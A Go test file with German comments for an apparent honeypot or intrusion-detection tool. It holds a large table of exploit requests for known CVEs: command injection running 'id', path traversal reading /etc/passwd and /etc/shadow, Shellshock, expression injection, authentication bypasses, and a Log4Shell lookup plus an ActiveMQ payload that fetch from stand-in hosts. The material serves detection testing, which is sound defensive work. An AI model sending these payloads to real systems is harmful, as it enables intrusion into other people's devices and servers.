package main

import (
	"strings"
	"testing"
	"time"
)

// req baut den Text einer Web-Anfrage wie eventText: Pfad, Body, Kopfzeilen.
func req(path, body, headers string) string { return path + "\n" + body + "\n" + headers }

// ruleExamples: je Regel (cverules.go) eine Anfrage, auf die sie passt. Nach dem Aufräumen
// (Ausnutzung verdrängt Probe, speziellere Regel die allgemeinere) muss sie noch dabei sein.
var ruleExamples = map[string]string{
	"gpon-bypass":            "/GponForm/diag_Form?images/",
	"gpon-cmd":               req("/GponForm/diag_Form?style/", "XWebPageName=diag&diag_action=ping&dest_host=`id`;&ipv=0", ""),
	"gpon-probe":             "/GponForm/",
	"huawei-hg532":           req("/ctrlt/DeviceUpgrade_1", "<NewStatusURL>$(id)</NewStatusURL>", ""),
	"huawei-hg532-probe":     "/ctrlt/DeviceUpgrade_1",
	"realtek-upnp":           req("/picsdesc.xml", "<NewInternalClient>`id`</NewInternalClient>", "SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"),
	"realtek-upnp-probe":     "/picsdesc.xml",
	"tplink-archer":          "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id)",
	"dlink-dns320":           "/cgi-bin/system_mgr.cgi?C1=ON&cmd=cgi_ntp_time&f_ntp_server=`id`",
	"dlink-dns320-probe":     "/cgi-bin/system_mgr.cgi?cmd=cgi_get_log_item",
	"dlink-hnap":             req("/HNAP1/", "", "SOAPAction: \"http://purenetworks.com/HNAP1/GetDeviceSettings/`id`\""),
	"dlink-hnap-probe":       "/HNAP1/",
	"hikvision-weblang":      req("/SDK/webLanguage", `<?xml version="1.0"?><language>$(id>webLib/x)</language>`, ""),
	"hikvision-auth":         "/Security/users?auth=YWRtaW46MTEK",
	"hikvision-probe":        "/SDK/webLanguage",
	"dahua-bypass":           req("/RPC2_Login", `{"method":"global.login","params":{"userName":"admin","password":"","clientType":"NetKeyboard","loginType":"Direct"}}`, ""),
	"dahua-probe":            "/RPC2_Login",
	"tbk-dvr":                "/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=id",
	"tbk-dvr-probe":          "/device.rsp?opt=user&cmd=list",
	"avtech-led":             "/cgi-bin/supervisor/Factory.cgi?action=white_led&brightness=$(id)",
	"avtech-probe":           "/cgi-bin/nobody/Machine.cgi?action=get_capability",
	"mvpower-shell":          "/shell?cd+/tmp;id",
	"linksys-themoon":        "/tmUnblock.cgi",
	"netgear-cgibin":         "/cgi-bin/;id",
	"netgear-dgn-setup":      "/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=id&curpath=/&currentsetting.htm=1",
	"netgear-ping":           req("/ping.cgi", "IPAddr1=1&ping=Ping&ping_IPAddr=127.0.0.1;id", ""),
	"netgear-dnslookup":      req("/dnslookup.cgi", "host_name=example.org;id&lookup=Lookup", ""),
	"zyxel-ztp":              req("/ztp/cgi-bin/handler", `{"command":"setWanPortSt","proto":"dhcp","port":"4","mtu":"; id;","data":"hi"}`, ""),
	"zyxel-weblogin":         "/adv,/cgi-bin/weblogin.cgi?username=admin';id&password=x",
	"zyxel-probe":            "/cgi-bin/weblogin.cgi",
	"eir-tr064":              req("/UD/act?1", "<NewNTPServer1>`id`</NewNTPServer1>", ""),
	"draytek-main":           req("/cgi-bin/mainfunction.cgi", "action=login&keyPath=%27%0A%2fbin%2fid%27&loginUser=a&loginPwd=a", ""),
	"draytek-probe":          "/cgi-bin/mainfunction.cgi",
	"ruckus-login":           "/forms/doLogin?login_username=admin&password=password$(id)&x=0&y=0",
	"emerge-door":            "/card_scan_decoder.php?No=30&door=%60id%60",
	"tenda-usb":              "/goform/setUsbUnload/.js?deviceName=A;id",
	"zeroshell":              "/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0Aid%0A%27",
	"zte-shell":              "/web_shell_cmd.gch",
	"boa-ping":               req("/boaform/admin/formPing", "target_addr=;id&waninf=1_INTERNET_R_VID_", ""),
	"boa-login":              req("/boaform/admin/formLogin", "username=admin&psd=Feefifofum", ""),
	"boa-probe":              "/boaform/admin/formLogin",
	"totolink-cmd":           req("/cgi-bin/cstecgi.cgi", `{"topicurl":"setDiagnosisCfg","ipDoamin":"$(id)"}`, ""),
	"totolink-probe":         "/cgi-bin/cstecgi.cgi",
	"vacron-board":           "/board.cgi?cmd=id",
	"cacti-agent":            req("/remote_agent.php?action=polldata&local_data_ids[0]=6&host_id=1&poller_id=`id`", "", "X-Forwarded-For: 127.0.0.1"),
	"cacti-probe":            "/remote_agent.php",
	"fortinet-lang":          "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession",
	"fortinet-admin":         req("/api/v2/cmdb/system/admin/admin", `{"ssh-public-key1":"x"}`, "User-Agent: Report Runner\nForwarded: for=\"[127.0.0.1]:8000\""),
	"fortinet-probe":         "/remote/login?lang=en",
	"fortiweb-traversal":     "/api/v2.0/cmdb/system/admin%3F/../../../../../cgi-bin/fwbcgi",
	"fortiweb-sqli":          req("/api/fabric/device/status", "", "Authorization: Bearer AAAAAA'or'1'='1"),
	"ivanti-cs-traversal":    "/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/",
	"ivanti-cs-bypass":       "/api/v1/totp/user-backup-code/../../system/system-information",
	"ivanti-cs-cmd":          "/api/v1/totp/user-backup-code/../../license/keys-status/;id",
	"ivanti-cs-probe":        "/dana-na/auth/url_default/welcome.cgi",
	"ivanti-epmm-bypass":     "/mifs/aad/api/v2/authorized/users?adminDeviceSpaceId=1",
	"ivanti-epmm-el":         "/api/v2/featureusage?format=${''.getClass().forName('java.lang.Runtime')}",
	"ivanti-epmm-probe":      "/mifs/user/login.jsp",
	"ivanti-vtm-bypass":      "/apps/zxtm/wizard.fcgi?error=1&section=Access+Management%3ALocalUsers",
	"ivanti-vtm-probe":       "/apps/zxtm/login.cgi",
	"citrix-traversal":       "/vpn/../vpns/cfg/smb.conf",
	"citrix-bleed":           req("/oauth/idp/.well-known/openid-configuration", "", "Host: "+strings.Repeat("a", 500)),
	"citrix-bleed2":          req("/p/u/doAuthentication.do", "login", "Content-Type: application/x-www-form-urlencoded"),
	"citrix-probe":           "/logon/LogonPoint/index.html",
	"cisco-asa-read":         "/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../",
	"cisco-asa-probe":        "/+CSCOE+/logon.html",
	"cisco-iosxe":            "/webui/logoutconfirm.html?logon_hash=1",
	"panos-gp-cookie":        req("/ssl-vpn/hipreport.esp", "", "Cookie: SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/x`id`"),
	"panos-authcheck":        req("/php/ztp_gate.php/.js.map", "", "X-PAN-AUTHCHECK: off"),
	"panos-probe":            "/global-protect/login.esp",
	"checkpoint-read":        req("/clients/MyCRL", "aCSHELL/../../../../../../../etc/shadow", ""),
	"checkpoint-probe":       "/clients/MyCRL",
	"f5-icontrol":            req("/mgmt/tm/util/bash", `{"command":"run","utilCmdArgs":"-c id"}`, "X-F5-Auth-Token: \nAuthorization: Basic YWRtaW46"),
	"f5-tmui":                "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd",
	"f5-probe":               "/tmui/login.jsp",
	"sonicwall-probe":        "/cgi-bin/welcome",
	"juniper-phprc":          req("/?PHPRC=/dev/fd/0", `auto_prepend_file="/etc/passwd"`, ""),
	"juniper-upload":         req("/webauth_operation.php", `rs=do_upload&rsargs[0]=[{"fileData":"data:text/plain;base64,aGFsbG8=","fileName":"x.txt","csize":5}]`, ""),
	"confluence-ognl21":      "/pages/createpage-entervariables.action?SpaceKey=x",
	"confluence-ognl22":      "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%29%7D/",
	"confluence-setup":       "/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false",
	"confluence-restore":     "/json/setup-restore.action?synchronous=true",
	"confluence-template":    req("/template/aui/text-inline.vm", "label=x", ""),
	"confluence-probe":       "/login.action?os_destination=%2Findex.action",
	"jira-ssrf":              "/plugins/servlet/gadgets/makeRequest?url=https://example.org",
	"jira-webinf":            "/s/x/_/;/WEB-INF/web.xml",
	"jira-probe":             "/rest/api/2/serverInfo",
	"bitbucket-archive":      "/rest/api/latest/projects/X/repos/y/archive?filename=a&at=b&path=c&prefix=ax%00--exec=%60id%60%00--remote=origin",
	"exchange-proxylogon":    req("/ecp/y.js", "", "Cookie: X-BEResource=localhost/owa/auth/logon.aspx?~3;"),
	"exchange-proxyshell":    "/autodiscover/autodiscover.json?@example.org/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@example.org",
	"exchange-proxynotshell": "/autodiscover/autodiscover.json?@example.org/powershell/?serializationLevel=Full&Email=autodiscover/autodiscover.json%3F@example.org",
	"exchange-probe":         "/owa/auth/logon.aspx",
	"sharepoint-toolshell":   req("/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx", "MSOTlPn_DWP=x", "Referer: /_layouts/SignOut.aspx"),
	"coldfusion-locale":      "/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en",
	"coldfusion-cfclient":    "/CFIDE/wizards/common/utils.cfc?method=wizardHash&inPassword=foo&_cfclient=true&returnFormat=wddx",
	"coldfusion-wddx":        req("/CFIDE/adminapi/accessmanager.cfc?method=foo&_cfclient=true", "argumentCollection=<wddxPacket version='1.0'><header/><data><struct type='x'></struct></data></wddxPacket>", ""),
	"coldfusion-uuid":        "/CFIDE/adminapi/_servermanager/servermanager.cfc?method=getHeartBeat",
	"coldfusion-probe":       "/CFIDE/componentutils/",
	"tomcat-default":         req("/manager/html", "", "Authorization: Basic dG9tY2F0OnRvbWNhdA=="),
	"tomcat-put-jsp":         req("/x.jsp/", "<% out.println(1); %>", ""),
	"tomcat-probe":           "/manager/text/list",
	"weblogic-console":       "/console/css/%252e%252e%252fconsole.portal",
	"weblogic-wsat":          req("/wls-wsat/CoordinatorPortType", `<soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"></work:WorkContext></soapenv:Header>`, ""),
	"weblogic-async":         req("/_async/AsyncResponseService", "<soapenv:Header><wsa:Action>x</wsa:Action><wsa:RelatesTo>x</wsa:RelatesTo></soapenv:Header>", ""),
	"weblogic-probe":         "/console/login/LoginForm.jsp",
	"jboss-readonly":         "/invoker/readonly",
	"jboss-probe":            "/jmx-console/",
	"struts-ognl":            req("/", "", "Content-Type: %{(#_='multipart/form-data')}"),
	"log4shell":              "/?x=${jndi:ldap://x.example/a}",
	"java4shell":             req("/rest/api/2/serverInfo", "", "Authorization: Basic "+strings.Repeat("A", 128)+"="),
	"spring4shell":           req("/", "class.module.classLoader.resources.context.parent.pipeline.first.pattern=x", ""),
	"spring-function":        req("/functionRouter", "x", `spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("id")`),
	"spring-gateway":         req("/actuator/gateway/routes/hacktest", `{"id":"hacktest","filters":[{"name":"AddResponseHeader","args":{"name":"Result","value":"#{T(java.lang.Runtime).getRuntime()}"}}]}`, "Content-Type: application/json"),
	"spring-heapdump":        "/actuator/heapdump",
	"spring-actuator":        "/actuator/env",
	"solr-velocity":          "/solr/db/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)",
	"solr-probe":             "/solr/admin/info/system?wt=json",
	"activemq-openwire":      `\x00\x00\x01\x1f\x1f\x01\x00org.springframework.context.support.ClassPathXmlApplicationContext\x01\x00\x1ehttp://example.org/poc.xml`,
	"ofbiz-bypass":           "/webtools/control/ping?USERNAME&PASSWORD=test&requirePasswordChange=Y",
	"ofbiz-programexport":    req("/webtools/control/forgotPassword/ProgramExport", "groovyProgram=x", ""),
	"ofbiz-traversal":        req("/webtools/control/forgotPassword/;/ProgramExport", "groovyProgram=x", ""),
	"ofbiz-probe":            "/webtools/control/main",
	"geoserver-eval":         "/geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),'id')",
	"geoserver-probe":        "/geoserver/web/",
	"jenkins-cli":            req("/cli?remoting=false", "", "Session: x\nSide: download"),
	"jenkins-descriptor":     "/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=x",
	"jenkins-probe":          "/jnlpJars/jenkins-cli.jar",
	"gitlab-exif":            req("/uploads/user", "AT&TFORM DJVM (metadata x)", ""),
	"gitlab-reset":           req("/users/password", "user%5Bemail%5D%5B%5D=a%40example.org&user%5Bemail%5D%5B%5D=b%40example.org", ""),
	"gitlab-probe":           "/users/sign_in",
	"grafana-traversal":      "/public/plugins/alertlist/../../../../../../../../etc/passwd",
	"nacos-bypass":           req("/nacos/v1/auth/users?username=x&password=y", "", "User-Agent: Nacos-Server"),
	"nacos-probe":            "/nacos/",
	"zimbra-mboximport":      "/service/extension/backup/mboximport?account-name=admin&ow=2&no-switch=1&append=1",
	"zimbra-xxe":             req("/Autodiscover/Autodiscover.xml", `<!DOCTYPE x [<!ENTITY x SYSTEM "file:///etc/passwd">]>`, ""),
	"moveit-sqli":            "/moveitisapi/moveitisapi.dll?action=m2",
	"moveit-probe":           "/human.aspx",
	"teamcity-token":         "/app/rest/users/id:1/tokens/RPC2",
	"teamcity-jsp":           "/hax?jsp=/app/rest/server;.jsp",
	"teamcity-probe":         "/app/rest/server",
	"screenconnect-setup":    "/SetupWizard.aspx/x",
	"screenconnect-probe":    "/SetupWizard.aspx",
	"openfire-setup":         "/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp",
	"manageengine-saml":      req("/SamlResponseServlet", "SAMLResponse=x", ""),
	"manageengine-adss":      "/./RestAPI/LogonCustomization",
	"vcenter-upload":         "/ui/vropspluginui/rest/services/uploadova",
	"vcenter-telemetry":      "/analytics/telemetry/ph/api/hyper/send?_c=&_i=/../../../../../../etc/cron.d/x",
	"vcenter-probe":          "/sdk/vimServiceVersions.xml",
	"workspaceone-ssti":      "/catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7b%22%66%72%65%65%22%7d",
	"sap-metadatauploader":   req("/developmentserver/metadatauploader?CONTENTTYPE=MODEL&CLIENT=1", "x", ""),
	"crushftp-include":       "/WebInterface/function/?command=exists&paths=<INCLUDE>/etc/passwd</INCLUDE>&c2f=x",
	"crushftp-aws":           req("/WebInterface/function/?command=getUserList", "", "Authorization: AWS4-HMAC-SHA256 Credential=crushadmin/"),
	"crushftp-probe":         "/WebInterface/login.html",
	"oracle-ebs":             "/OA_HTML/configurator/UiServlet",
	"oracle-ebs-probe":       "/OA_HTML/AppsLocalLogin.jsp",
	"wazuh-runas":            req("/security/user/authenticate/run_as", `{"__unhandled_exc__":{"__class__":"exit","__args__":[]}}`, ""),
	"langflow-code":          req("/api/v1/validate/code", `{"code":"def x(): pass"}`, ""),
	"nextjs-middleware":      req("/dashboard", "", "x-middleware-subrequest: middleware:middleware:middleware"),
	"react2shell":            req("/", `0={"then":"$1:__proto__:then","status":"resolved_model"}`, "Next-Action: x"),
	"xwiki-solr":             "/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D",
	"metabase-setup":         req("/api/setup/validate", `{"token":"x","details":{"engine":"h2"}}`, ""),
	"metabase-probe":         "/api/session/properties",
	"sitecore-report":        "/sitecore/shell/ClientBin/Reporting/Report.ashx",
	"telerik-rau":            req("/Telerik.Web.UI.WebResource.axd?type=rau", "rauPostData=x", ""),
	"telerik-probe":          "/Telerik.Web.UI.WebResource.axd?type=rau",
	"goanywhere-lic":         "/goanywhere/lic/accept",
	"goanywhere-setup":       "/goanywhere/wizard/InitialAccountSetup.xhtml",
	"goanywhere-probe":       "/goanywhere/auth/Login.xhtml",
	"papercut-setup":         "/app?service=page/SetupCompleted",
	"liferay-jsonws":         req("/api/jsonws/invoke", "cmd=%7B%7D&p_auth=x&%2BdefaultData=x", ""),
	"liferay-probe":          "/api/jsonws",
	"fog-export":             "/fog/management/export.php?filename=$(id)&type=pxe",
	"fog-probe":              "/fog/management/index.php",
	"solarwinds-whd":         req("/helpdesk/WebObjects/Helpdesk.woa/ra/OrionTickets/", "", "Authorization: Basic eA=="),
	"solarwinds-whd-probe":   "/helpdesk/WebObjects/Helpdesk.woa",
	"apisix-key":             req("/apisix/admin/routes", "{}", "X-API-KEY: edd1c9f034335f136f87ad84b625c8f1"),
	"apisix-probe":           "/apisix/admin/routes",
	"webmin-pwchange":        req("/password_change.cgi", "user=rootxx&pam=&expired=2&old=test|id&new1=test2&new2=test2", ""),
	"webmin-probe":           "/session_login.cgi",
	"elastic-script":         req("/_search?pretty", `{"size":1,"script_fields":{"x":{"script":"java.lang.Math.class.forName(\"java.lang.Runtime\")"}}}`, ""),
	"elastic-probe":          "/_cat/indices",
	"yarn-app":               "/ws/v1/cluster/apps/new-application",
	"yarn-probe":             "/ws/v1/cluster/info",
	"docker-api":             req("/v1.41/containers/create", `{"Image":"alpine","Cmd":["id"]}`, ""),
	"docker-probe":           "/v1.24/version",
	"kubelet-exec":           "/run/default/pod-1/container-1?cmd=id",
	"kubelet-probe":          "/runningpods/",
	"joomla-config":          "/api/index.php/v1/config/application?public=true",
	"joomla-probe":           "/administrator/manifests/files/joomla.xml",
	"drupalgeddon2":          req("/user/register?element_parents=account/mail/%23value&ajax_form=1", "form_id=user_register_form&mail[#post_render][]=exec", ""),
	"vbulletin-widget":       req("/index.php?routestring=ajax/render/widget_php", "widgetConfig[code]=echo 1;", ""),
	"vbulletin-tab":          req("/ajax/render/widget_tabbedcontainer_tab_panel", "subWidgets[0][template]=widget_php&subWidgets[0][config][code]=echo 1;", ""),
	"wp-filemanager":         "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php",
	"wp-socialwarfare":       "/wp-admin/admin-post.php?swp_debug=load_options&swp_url=https://example.org/x.txt",
	"wp-automatic":           "/wp-content/plugins/wp-automatic/inc/csv.php",
	"wp-backup-migration":    "/wp-content/plugins/backup-backup/includes/backup-heart.php",
	"wp-bricks":              "/wp-json/bricks/v1/render_element",
	"wp-revslider":           "/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php",
	"phpunit-eval":           "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
	"php-cgi-softhyphen":     "/php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
	"php-cgi-args":           "/cgi-bin/php-cgi?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input",
	"php-pearcmd":            "/index.php?+config-create+/&lang=../../../../usr/local/lib/php/pearcmd&/x+/tmp/x.php",
	"thinkphp-invoke":        `/?s=/Index/\think\app/invokefunction&function=call_user_func_array`,
	"thinkphp-50x":           `/index.php?s=index/\think\app/invokefunction`,
	"thinkphp-lang":          "/index.php?lang=../../../../../public/index",
	"laravel-ignition":       req("/_ignition/execute-solution", `{"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"}`, ""),
	"laravel-probe":          "/_ignition/health-check",
	"symfony-fragment":       "/_fragment?_path=_controller%3Dsystem%26command%3Did&_hash=x",
	"symfony-profiler":       "/_profiler/phpinfo",
	"phpmyadmin-lfi":         "/index.php?target=db_sql.php%253f/../../../../../../etc/passwd",
	"apache-traversal":       "/cgi-bin/.%2e/.%2e/.%2e/bin/sh",
	"apache-traversal2":      "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/bin/sh",
	"shellshock":             req("/cgi-bin/status", "", "User-Agent: () { :; }; /bin/bash -c id"),
}

func hitIDs(hits []cveRule) []string {
	var ids []string
	for _, r := range hits {
		ids = append(ids, r.ID)
	}
	return ids
}

func TestCVERules(t *testing.T) {
	for _, r := range cveRules {
		if r.Product == "" || r.Name == "" || r.Kind != kindExploit && r.Kind != kindProbeR || r.CVE != "" && !cveIDRe.MatchString(r.CVE) {
			t.Errorf("%s: unvollständig (%q %q %q %q)", r.ID, r.Kind, r.Product, r.CVE, r.Name)
		}
		if r.over != "" {
			if _, ok := ruleByIDMap[r.over]; !ok {
				t.Errorf("%s verdrängt unbekannte Regel %s", r.ID, r.over)
			}
		}
		ex, ok := ruleExamples[r.ID]
		if !ok {
			t.Errorf("%s ohne Beispiel", r.ID)
			continue
		}
		if !contains(hitIDs(eventRules(ex, "web")), r.ID) {
			t.Errorf("%s passt nicht auf %q (Treffer: %v)", r.ID, ex, hitIDs(eventRules(ex, "web")))
		}
	}
	for id := range ruleExamples {
		if _, ok := ruleByIDMap[id]; !ok {
			t.Errorf("Beispiel für unbekannte Regel %s", id)
		}
	}
	// am Angriff und im Bericht
	e := evAt(time.Time{}, "request", "http", "", 80, map[string]any{"path": "/ctrlt/DeviceUpgrade_1", "body": "<NewStatusURL>$(id)</NewStatusURL>", "method": "POST"})
	a := attackOf(e)
	if len(a.CVEs) != 1 || a.CVEs[0].Key != "CVE-2017-17215" || a.CVEs[0].Label != "Huawei HG532 (Router): Befehlsausführung über UPnP" || len(a.Mitre) == 0 {
		t.Fatalf("Angriff: %v %v", a.CVEs, a.Mitre)
	}
	if len(a.Exploits) != 1 || a.Exploits[0].ID != "huawei-hg532" || a.Exploits[0].Path != "POST /ctrlt/DeviceUpgrade_1" || !hasTag(a, "known_exploit") {
		t.Fatalf("Regeltreffer: %+v", a.Exploits)
	}
	if r := BuildReport("x", []*Event{e}, false); len(r.CVEs) != 1 || r.Severity != "hoch" || len(r.Rules) != 1 || !strings.Contains(r.Text(), "Pfad → Produkt → CVE") {
		t.Fatalf("Bericht: %v %s %v", r.CVEs, r.Severity, r.Rules)
	}
	// eine Probe: Regeltreffer, aber keine Lücke und keine hohe Schwere
	p := attackOf(evAt(time.Time{}, "request", "http", "", 80, map[string]any{"path": "/SDK/webLanguage", "method": "GET"}))
	if len(p.CVEs) != 0 || len(p.Exploits) != 1 || p.Exploits[0].Kind != kindProbeR || p.Exploits[0].CVE != "CVE-2021-36260" || !hasTag(p, "product_probe") {
		t.Fatalf("Probe: %v %+v", p.CVEs, p.Exploits)
	}
}

// Gewöhnliche Anfragen lösen keine Regel aus.
func TestCVERulesNegative(t *testing.T) {
	harmless := append([]string{"/index.html", "/wp-login.php", "/.env", "/robots.txt", "/version", "/api/v1/users", "/remote/",
		"/manager", "/console", "/login", "/vpn/", "/cgi-bin/test.cgi?name=x", "/search?q=$5", "/index.php?lang=de", "/shell", "/actuator/health",
		req("/login", "user=a&password=b", "Authorization: Basic YWRtaW46YWRtaW4="), req("/", "", "Cookie: SESSID=abc123; theme=dark"),
		"/images/foo.jsp", "/app/rest", "/api/setup", "/containers", "/_search?q=test", "/nacos", "/geoserver", "/run/user/1000"}, benignRequests...)
	for _, s := range harmless {
		if m := eventRules(s, "web"); len(m) != 0 {
			t.Errorf("%q löst %v aus", strings.SplitN(s, "\n", 2)[0], hitIDs(m))
		}
	}
	if m := eventRules("/SDK/webLanguage", "cmd"); len(m) != 0 {
		t.Errorf("Befehle werden nicht geprüft: %v", hitIDs(m))
	}
}

// Ausnutzung verdrängt die Probe desselben Produkts; speziellere Regeln die allgemeineren.
func TestCVERulesCleanup(t *testing.T) {
	cases := map[string][]string{
		ruleExamples["hikvision-weblang"]:                                 {"hikvision-weblang"},
		"/SDK/webLanguage":                                                {"hikvision-probe"},
		ruleExamples["exchange-proxynotshell"]:                            {"exchange-proxynotshell"},
		ruleExamples["coldfusion-wddx"]:                                   {"coldfusion-wddx"},
		ruleExamples["thinkphp-50x"]:                                      {"thinkphp-50x"},
		ruleExamples["ofbiz-traversal"]:                                   {"ofbiz-traversal"},
		ruleExamples["docker-api"]:                                        {"docker-api"},
		ruleExamples["tomcat-default"]:                                    {"tomcat-default"},
		ruleExamples["ivanti-cs-cmd"]:                                     {"ivanti-cs-bypass", "ivanti-cs-cmd"},
		ruleExamples["gpon-cmd"]:                                          {"gpon-cmd"},
		"/GponForm/diag_Form?images/\nXWebPageName=diag&dest_host=`id`\n": {"gpon-bypass", "gpon-cmd"},
		ruleExamples["php-pearcmd"]:                                       {"php-pearcmd", "thinkphp-lang"},
	}
	for text, want := range cases {
		if got := hitIDs(eventRules(text, "web")); strings.Join(got, ",") != strings.Join(want, ",") {
			t.Errorf("%q: %v, erwartet %v", strings.SplitN(text, "\n", 2)[0], got, want)
		}
	}
	// Proben zählen nicht als Lücke (Stufe, Bericht), aber als Regeltreffer
	if c := eventCVEs("/SDK/webLanguage", "web"); len(c) != 0 {
		t.Errorf("Probe als CVE: %v", hitIDs(c))
	}
	if ids := analyzeText("/SDK/webLanguage", "web").ids; !contains(ids, "product_probe") || contains(ids, "known_exploit") {
		t.Errorf("Muster der Probe: %v", ids)
	}
	// Rohdaten (Payload an einem anderen Port) werden ebenso geprüft
	if got := hitIDs(eventRules(ruleExamples["activemq-openwire"], "raw")); len(got) != 1 || got[0] != "activemq-openwire" {
		t.Errorf("Rohdaten: %v", got)
	}
}
